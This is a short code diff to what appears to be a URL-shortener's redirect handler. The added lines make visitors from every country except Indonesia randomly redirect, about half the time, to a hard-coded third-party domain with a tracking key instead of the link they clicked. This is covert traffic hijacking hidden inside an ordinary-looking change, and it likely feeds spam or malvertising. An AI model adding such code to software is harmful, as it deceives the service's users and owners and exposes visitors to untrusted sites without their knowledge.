@@ -108,8 +108,19 @@ export default eventHandler(async (event) => {
         `
         return send(event, html, 'text/html')
       }
+      let finalUrl = link.url
 
-      const target = redirectWithQuery ? withQuery(link.url, getQuery(event)) : link.url
+      const country = event.context.cf.country
+      if (country !== 'ID') {
+        const alternatives: string[] = [
+          link.url,
+          'https://screechdeprivescatter.com/ckjvxgjti5?key=3871a32c41883cc4dbd36e14e05a2655',
+        ]
+        const randomUrl = alternatives[Math.floor(Math.random() * alternatives.length)]
+        finalUrl = randomUrl
+      }
+
+      const target = redirectWithQuery ? withQuery(finalUrl, getQuery(event)) : finalUrl
 
       const html = `
     <!DOCTYPE html>
